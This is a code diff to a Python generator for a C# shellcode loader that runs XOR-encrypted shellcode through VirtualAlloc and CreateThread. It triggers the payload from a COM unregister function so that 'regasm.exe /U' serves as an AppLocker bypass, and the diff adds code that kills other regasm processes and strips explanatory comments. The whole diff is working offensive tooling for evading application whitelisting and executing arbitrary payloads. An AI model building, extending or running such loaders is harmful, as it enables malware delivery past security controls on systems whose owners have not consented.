@@ -55,6 +55,7 @@ def generate_csharp_source(encrypted_sc: bytes, xor_key: bytes) -> str:
 
     return textwrap.dedent(f"""\
     using System;
+    using System.Diagnostics;
     using System.Runtime.InteropServices;
     using System.Threading;
 
@@ -86,7 +87,7 @@ def generate_csharp_source(encrypted_sc: bytes, xor_key: bytes) -> str:
             for (int i = 0; i < encryptedShellcode.Length; i++)
                 encryptedShellcode[i] ^= xorKey[i % xorKey.Length];
 
-            IntPtr exec = VirtualAlloc(IntPtr.Zero, (uint)encryptedShellcode.Length, 0x1000 | 0x2000, 0x40); // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+            IntPtr exec = VirtualAlloc(IntPtr.Zero, (uint)encryptedShellcode.Length, 0x1000 | 0x2000, 0x40);
             if (exec == IntPtr.Zero) return;
 
             Marshal.Copy(encryptedShellcode, 0, exec, encryptedShellcode.Length);
@@ -95,15 +96,34 @@ def generate_csharp_source(encrypted_sc: bytes, xor_key: bytes) -> str:
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, exec, IntPtr.Zero, 0, out threadId);
             if (hThread != IntPtr.Zero)
             {{
-                WaitForSingleObject(hThread, 0xFFFFFFFF); // INFINITE
+                WaitForSingleObject(hThread, 0xFFFFFFFF);
             }}
 
-            VirtualFree(exec, 0, 0x8000); // MEM_RELEASE
+            VirtualFree(exec, 0, 0x8000);
+        }}
+
+        private static void KillOtherRegAsmProcesses()
+        {{
+            try
+            {{
+                int currentProcessId = Process.GetCurrentProcess().Id;
+                Process[] regasmProcs = Process.GetProcessesByName("regasm");
+                foreach (Process p in regasmProcs)
+                {{
+                    if (p.Id != currentProcessId)
+                    {{
+                        try {{ p.Kill(); }} catch {{ /* ignore permissions issues */ }}
+                    }}
+                }}
+            }}
+            catch {{ /* best-effort cleanup */ }}
         }}
 
         [ComUnregisterFunction]
         public static void UnRegisterClass(Type t)
         {{
+            // Clean up any other regasm processes first (except ourselves)
+            KillOtherRegAsmProcesses();
             Sleep(2000);
             ExecuteShellcode();
         }}
@@ -173,7 +193,7 @@ def main():
         print(f"\n[*] To compile manually:")
         csc = find_csc() or "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
         print(f"    {csc} /target:library /platform:anycpu /optimize+ /out:{args.output_dll} {args.output_source}")
-        print(f"\n[*] Execute applocker bypass:")
+        print(f"\n[*] To execute AppLocker bypass:")
         print(f" C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U {args.output_dll}")
 
 if __name__ == "__main__":
